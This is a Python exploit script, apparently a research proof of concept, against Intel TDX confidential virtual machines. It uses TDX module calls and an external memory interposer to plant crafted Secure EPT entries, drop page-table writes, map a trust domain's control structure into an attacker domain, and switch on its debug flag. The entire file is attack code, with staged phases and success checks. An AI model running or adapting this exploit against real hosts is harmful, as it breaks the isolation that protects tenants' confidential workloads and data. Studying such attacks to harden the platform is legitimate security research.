import ctypes
import sys
from argparse import ArgumentParser
from gateway import Gateway, FOUR_KILOBYTES
from tdxtend import Tdxtend, INVALID_PID, TdxStatus, TdxErrorCode
from tdxamine import State
import os
import signal
import struct


HKID_MASK = 0xFC00000000000
HKID_START_BIT = 52 - 6

# Standard Colors (Dimmer)
RED     = "\033[31m"
GREEN   = "\033[32m"
YELLOW  = "\033[33m"
BLUE    = "\033[34m"
MAGENTA = "\033[35m"
CYAN    = "\033[36m"

# Bright/Bold Versions (Often better for headers)
BRIGHT_RED   = "\033[91m"
BRIGHT_GREEN = "\033[92m"
BRIGHT_WHITE = "\033[97m"
GREY         = "\033[90m"
RESET        = "\033[00m"

def print_success(msg):
  print(f"{BRIGHT_GREEN}[+] {msg}{RESET}")

def print_error(msg):
  print(f"{BRIGHT_RED}[-] {msg}{RESET}")

def print_warning(msg):
  print(f"{YELLOW}[*] {msg}{RESET}")

def print_info(msg):
  print(f"{GREY}    {msg}{RESET}")

def read_td_bytes(tdxtend, tdr_pa, start_gpa, size=64):
  full_data = b""
  
  # Iterate 8 times to get 64 bytes total (8 bytes per call)
  for i in range(0, size, 8):
    current_gpa = start_gpa + i
    rax, _, _, r8 = tdxtend.call_tdh_mem_rd(tdr_pa, current_gpa)
    
    # Should not fail, we checked this before
    if rax == TdxErrorCode.TDX_SUCCESS.value:
      full_data += struct.pack("<Q", r8)
    else:
      print_error(f"Read failed at GPA {hex(current_gpa)} with error {hex(rax)}")
      return None

  return full_data

def print_hexdump(data):
  for i in range(0, len(data), 16):
    chunk = data[i:i+16]
    
    hex_values = " ".join(f"{b:02x}" for b in chunk)
    # Add extra padding if the last line is short
    if len(chunk) < 16:
      hex_values += "   " * (16 - len(chunk))
    
    ascii_repr = "".join(chr(b) if 32 <= b <= 126 else "." for b in chunk)
    
    print(f"{hex_values}  |{ascii_repr}|")

def remap(tdxtend: Tdxtend, gateway: Gateway, tdr_pa, gpa, hpa, orig_hpa):
  print(f"[*] Remapping HPA={orig_hpa:#08x} --> HPA={hpa:#08x}")

  print_info("TDH.MEM.RANGE.BLOCK")

  rc, rcx, rdx = tdxtend.call_tdh_mem_range_block(tdr_pa, gpa, 0)

  if rc != TdxErrorCode.TDX_SUCCESS.value:
    print_error("Error while calling TDH.MEM.RANGE.BLOCK")
    print_error(f"  RC: {rc:#x}")
    print_error(f" RCX: {rcx:#x}")
    print_error(f" RDX: {rdx:#x}")
    return False

  print_info("TDH.MEM.TRACK")

  rc = tdxtend.call_tdh_mem_track(tdr_pa)
  gateway.req_outside_guest_mode()

  if rc != TdxErrorCode.TDX_SUCCESS.value:
    print_error("Error while calling TDH.MEM.TRACK")
    return False
  
  print_info("TDH.MEM.PAGE.RELOCATE")

  rc, rcx, rdx = tdxtend.call_tdh_mem_page_relocate(tdr_pa, gpa, 0, hpa)

  if rc != TdxErrorCode.TDX_SUCCESS.value:
    print_error("Error while calling TDH.MEM.PAGE.RELOCATE")
    print_error(f"  {TdxStatus(rc)}")
    print_error(f" RCX: {rcx:#x}")
    print_error(f" RDX: {rdx:#x}")

    print_error("")
    print_error("Attempting to unblock the page")

    print_error("")
    print_error("Calling TDH.MEM.RANGE.UNBLOCK")

    rc, rcx, rdx = tdxtend.call_tdh_mem_range_unblock(tdr_pa, gpa, 0)

    if rc != TdxErrorCode.TDX_SUCCESS.value:
      print_error("  Error while calling TDH.MEM.RANGE.UNBLOCK")
      print_error(f"  {TdxStatus(rc)}")
      print_error(f"  RCX: {rcx:#x}")
      print_error(f"  RDX: {rdx:#x}")
      return False
    
  return True

def decode_l1_secure_ept_entry(entry: int):
  """
  Decodes and prints the fields of a 64-bit L1 Secure EPT Entry 
  based on Intel TDX specifications.
  """
  
  # Define the layout: (Full Name, LSB, Size in bits)
  # Note: "Ignored" fields (bits 11, 59, 62) are deliberately skipped.
  fields = [
    ("Read", 0, 1),
    ("Write", 1, 1),
    ("Execute", 2, 1),
    ("Memory Type", 3, 3),
    ("Ignore PAT", 6, 1),
    ("Leaf", 7, 1),
    ("Accessed", 8, 1),
    ("Dirty", 9, 1),
    ("Execute User", 10, 1),
    ("Host Physical Address", 12, 40),
    ("Verify Guest Paging", 57, 1),
    ("Paging-Write Access", 58, 1),
    ("Supervisor Shadow Stack", 60, 1),
    ("Check Sub-Page Permissions", 61, 1),
    ("Suppress #VE", 63, 1),
  ]

  for name, lsb, size in fields:
    # Create a mask of 'size' bits of 1s (e.g., size 3 -> 0b111)
    mask = (1 << size) - 1
    
    # Shift the target bits to the 0th position and apply the mask
    value = (entry >> lsb) & mask
    
    # Format the output based on whether it's a single bit or a larger field
    if size == 1:
      print_info(f"- {name:<35}: {value}")
    else:
      print_info(f"- {name:<35}: 0x{value:X}")

def add_sept_entry(tdxtend, tdr_pa, gpa, target_hpa, level):
  print(f"[*] Creating level {level} SEPT entry for GPA={gpa:#x}")

  rc, rcx, rdx, r8 = tdxtend.call_tdh_mem_sept_add(tdr_pa, gpa, level, target_hpa, True)

  if rc != TdxErrorCode.TDX_SUCCESS.value:
    print_error(f"Error while calling TDH.MEM.SEPT.ADD on level {level}")
    print_error(f"  RAX: {rc:#x}")
    print_error(f"  RCX: {rcx:#x}")
    print_error(f"  RDX: {rdx:#x}")
    print_error(f"  R8:  {r8:#x}")
    return False
  else:
    if r8 == 0xFFFFFFFFFFFFFFFF:
      print_info(f"Successfully added level {level} SEPT entry")
    elif (r8 >> 63) & 1 == 1:
      print_info(f"Level {level} SEPT entry for given GPA already exists")
    else:
      print_error("This should not be reached...")
      print_error(f"  RCX: {rcx:#x}")
      print_error(f"  RDX: {rdx:#x}")
      print_error(f"  R8:  {r8:#x}")
  return True

def main():
  parser = ArgumentParser(description="TDX SEPT Memory Dropping Exploit Prototype")
  parser.add_argument(
      "--gpa",
      type=lambda x: int(x, 0),
      help="GPA for which to create a new SEPT entry",
  )
  parser.add_argument(
      "--gpa2",
      type=lambda x: int(x, 0),
      help="Second GPA for which to create a new SEPT entry",
  )
  parser.add_argument(
      "--gpa3",
      type=lambda x: int(x, 0),
      required=True,
      help="Third GPA for which to create a new SEPT entry",
  )
  parser.add_argument(
      "--init-gpa",
      type=lambda x: int(x, 0),
      help="GPA with buffer for initializing location",
  )
  parser.add_argument(
      "--target-hpa",
      type=lambda x: int(x, 0),
      help="Target HPA for level 1",
  )

  parser.add_argument(
      "--target-hpa2",
      type=lambda x: int(x, 0),
      help="Second target HPA for level 1",
  )

  parser.add_argument(
      "--safe-hpa",
      type=lambda x: int(x, 0),
      help="Safe HPA for level > 1",
  )
  args = parser.parse_args()

  # TODO: Can probably generate suitable GPAs and HPAs automatically
  victim_gpa = args.gpa
  second_victim_gpa = args.gpa2
  third_victim_gpa = args.gpa3
  init_gpa = args.init_gpa
  target_hpa = args.target_hpa
  safe_hpa = args.safe_hpa
  second_target_hpa = args.target_hpa2

  sept_page_control = safe_hpa + 0x2000

  with open("/tmp/tdx-vm-3.pid", 'r') as f:
    pid_attacker = int(f.read().strip())

  gateway = Gateway()
  tdxtend = Tdxtend(INVALID_PID, gateway)

  # TODO: have PID be cmd-line argument
  tdr_pa_attacker2 = gateway.get_tdr_pa(pid_attacker)
  tdcs_pa_attacker2 = gateway.get_tdcs_pa(pid_attacker)

  hkid_attacker = 0x21  # TODO: gateway.get_hkid()
  hkid_victim = 0x22  # TODO: gateway.get_hkid()
  hkid_attacker_2 = 0x23  # TODO: gateway.get_hkid()

  print("[*] Querying TD details")
  print_info(f"TDR PA:  {tdr_pa_attacker2:#x}")
  print_info(f"TDCS PA: {tdcs_pa_attacker2:#x}")
  print_info(f"HKID:    {hkid_attacker_2:#x}")
  malicious_sept_pa = tdcs_pa_attacker2 | (hkid_attacker_2 << HKID_START_BIT)
  print()

  print(f"[*] Phase 1: Crafting Malicious SEPT Entry")
  ATTR_SVE = 1 << 63
  
  flags = ATTR_SVE | 0x4f7
  malicious_sept_entry = malicious_sept_pa | flags
  

  print(f"[*] Crafted Malicious SEPT Entry: {hex(malicious_sept_entry)}")
  
  decode_l1_secure_ept_entry(malicious_sept_entry)

  print("[*] Enter SEPT entry in attacker VM and press enter")
  input("")
  print("[*] Initializing target HPA with malicious SEPT entry")

  # Retrieving the current HPA corresponding to the GPA
  rc, rcx, rdx, _ = tdxtend.call_tdh_mem_sept_rd(tdr_pa_attacker2, init_gpa, 0)

  if rc != TdxErrorCode.TDX_SUCCESS.value:
    print_error("Error while calling TDH.MEM.SEPT.RD")
    print_error(f" RCX: {rcx:#x}")
    print_error(f" RDX: {rdx:#x}")
    return

  # cf. Table 3.32 of TDX module ABI
  victim_original_hpa = rcx & 0x000ffffffffff000

  success = remap(tdxtend, gateway, tdr_pa_attacker2, init_gpa, target_hpa, victim_original_hpa)
  if not success:
    return
  
  success = remap(tdxtend, gateway, tdr_pa_attacker2, init_gpa, victim_original_hpa, target_hpa)
  if not success:
    return

  print(f"[*] HPA={target_hpa:#x} is now initialized with malicious SEPT entry") 
  

  print("\n[*] Phase 2: Dropping write from TDH.MEM.SEPT.ADD")
  # We promote the exact same physical page to be a SEPT structure page.

  success = add_sept_entry(tdxtend, tdr_pa_attacker2, victim_gpa & 0xFFFFFF8000000000, safe_hpa, 3)
  if not success:
    return
  success = add_sept_entry(tdxtend, tdr_pa_attacker2, victim_gpa & 0xFFFFFFFFC0000000, safe_hpa + 0x1000, 2)
  if not success:
    return
  
  input("\n[*] Enable the interposer and press enter")
  success = add_sept_entry(tdxtend, tdr_pa_attacker2, victim_gpa & 0xFFFFFFFFFFE00000, target_hpa, 1)
  
  input("\n[*] Disable the interposer and press enter")

  if not success:
    print_error("Unable to add SEPT pages.")
    sys.exit(1)



  print(f"[*] Verifying dropped write")
  # We verify the poisoned SEPT architecture by reading the VMM leaf at Level 0
  # On Non-Debug TDs this SEAMCALL is perfectly legal as long as bit 0 of tdr_pa is not set.
  rc, rcx, rdx, _ = tdxtend.call_tdh_mem_sept_rd(tdr_pa_attacker2, victim_gpa, 0)
  if rc == TdxErrorCode.TDX_SUCCESS.value:
    print_info(f"TDH.MEM.SEPT.RD returned entry: {hex(rcx)}")
    # TDH.MEM.SEPT.RD sanitizes the HKID
    if (rcx | (hkid_attacker_2 << HKID_START_BIT)) == malicious_sept_entry:
      print_success(f"Succesfully dropped page, SEPT entry points to SEPT page.")
      print_success(f"The victim TDCS structure is now mapped into the attacker TD at GPA: {hex(victim_gpa)}.")
    else:
      print_error(f"SEPT entry does not match injected {hex(malicious_sept_entry)}.")
      sys.exit(1)
  else:
    print_error(f"[-] failed: {TdxStatus(rc)}")


  print(f"[*] Phase 3: Flipping debug flag\n")

  input(f"[*] Overwrite attributes at GPA={victim_gpa+128:#x} and press enter")

  gpa_to_read = victim_gpa+128

  print(f"[*] Verifying debug status")
  rax, rcx, rdx, r8 = tdxtend.call_tdh_mem_rd(tdr_pa_attacker2, gpa_to_read)
  
  if rax == TdxErrorCode.TDX_SUCCESS.value:
    print_success("Exploit successful: Second attacker TD is now debuggable")
    victim_is_debug = True
  elif rax == TdxErrorCode.TDX_TD_NON_DEBUG.value:
    print_error("Second attacker TD is not debuggable (TDX_TD_NON_DEBUG)")
    sys.exit(1)
  else:
    print_error(f"Exploit status unclear. TDH.MEM.RD returned {TdxStatus(rax)}")
    print_error(f" {hex(rax)}")
    print_error(f" {hex(rcx)}")
    print_error(f" {hex(rdx)}")
    print_error(f" {hex(r8)}")
    sys.exit(1)
  
  print("\n[*] Phase 4: Crafting Second malicious SEPT entry")
  ATTR_SVE = 1 << 63
  
  malicious_sept_pa = sept_page_control | (hkid_attacker_2 << HKID_START_BIT)
  flags = ATTR_SVE | 0x4f7
  malicious_sept_entry = malicious_sept_pa | flags
  

  print(f"[*] Crafted Malicious SEPT Entry: {hex(malicious_sept_entry)}")
  
  decode_l1_secure_ept_entry(malicious_sept_entry)

  # Technically we don't need the VM anymore at this point, can just use TDH.MEM.WR
  print("[*] Enter SEPT entry in attacker VM and press enter")
  input("")
  print("[*] Initializing target HPA with malicious SEPT entry")

  # Retrieving the current HPA corresponding to the GPA
  rc, rcx, rdx, _ = tdxtend.call_tdh_mem_sept_rd(tdr_pa_attacker2, init_gpa, 0)

  if rc != TdxErrorCode.TDX_SUCCESS.value:
    print_error("Error while calling TDH.MEM.SEPT.RD")
    print_error(f" RCX: {rcx:#x}")
    print_error(f" RDX: {rdx:#x}")
    return

  # cf. Table 3.32 of TDX module ABI
  victim_original_hpa = rcx & 0x000ffffffffff000

  success = remap(tdxtend, gateway, tdr_pa_attacker2, init_gpa, second_target_hpa, victim_original_hpa)
  if not success:
    return
    
  success = remap(tdxtend, gateway, tdr_pa_attacker2, init_gpa, victim_original_hpa, second_target_hpa)
  if not success:
    return

  print(f"[*] HPA={second_target_hpa:#x} is now initialized with malicious SEPT entry") 

  print("\n[*] Phase 5: Dropping write from TDH.MEM.SEPT.ADD")
  # We promote the exact same physical page to be a SEPT structure page.

  success = add_sept_entry(tdxtend, tdr_pa_attacker2, second_victim_gpa & 0xFFFFFF8000000000, safe_hpa + 0x4000, 3)
  if not success:
    return
  success = add_sept_entry(tdxtend, tdr_pa_attacker2, second_victim_gpa & 0xFFFFFFFFC0000000, safe_hpa + 0x5000, 2)
  if not success:
    return
  
  input("\n[*] Enable the interposer and press enter")
  success = add_sept_entry(tdxtend, tdr_pa_attacker2, second_victim_gpa & 0xFFFFFFFFFFE00000, second_target_hpa, 1)
  
  input("\n[*] Disable the interposer and press enter")

  if not success:
    print_error("Unable to add SEPT pages.")
    sys.exit(1)



  print(f"[*] Verifying dropped write")
  # We verify the poisoned SEPT architecture by reading the VMM leaf at Level 0
  # On Non-Debug TDs this SEAMCALL is perfectly legal as long as bit 0 of tdr_pa is not set.
  rc, rcx, rdx, _ = tdxtend.call_tdh_mem_sept_rd(tdr_pa_attacker2, second_victim_gpa, 0)
  if rc == TdxErrorCode.TDX_SUCCESS.value:
    print_info(f"TDH.MEM.SEPT.RD returned entry: {hex(rcx)}")
    # TDH.MEM.SEPT.RD sanitizes the HKID
    if (rcx | (hkid_attacker_2 << HKID_START_BIT)) == malicious_sept_entry:
      print_success(f"Succesfully dropped page, SEPT entry points to SEPT page.")
      print_success(f"The victim TDCS structure is now mapped into the attacker TD at GPA: {hex(second_victim_gpa)}.")
    else:
      print_error(f"SEPT entry does not match injected {hex(malicious_sept_entry)}.")
      sys.exit(1)
  else:
    print_error(f"[-] failed: {TdxStatus(rc)}")

  print("\n[*] Adding SEPT entry TDH.MEM.SEPT.ADD")
  success = add_sept_entry(tdxtend, tdr_pa_attacker2, third_victim_gpa & 0xFFFFFF8000000000, safe_hpa + 0x6000, 3)
  if not success:
    return
  success = add_sept_entry(tdxtend, tdr_pa_attacker2, third_victim_gpa & 0xFFFFFFFFC0000000, safe_hpa + 0x7000, 2)
  if not success:
    return
  success = add_sept_entry(tdxtend, tdr_pa_attacker2, third_victim_gpa & 0xFFFFFFFFFFE00000, sept_page_control, 1)
  
  if not success:
    print_error("Unable to add SEPT pages.")
    sys.exit(1)

  print("[*] Added SEPT entry, now should be initialized")

  print("[*] Second attacker TD now is debug + can write to it's own SEPT entries")

  print("[*] Done")

if __name__ == "__main__":
  main()
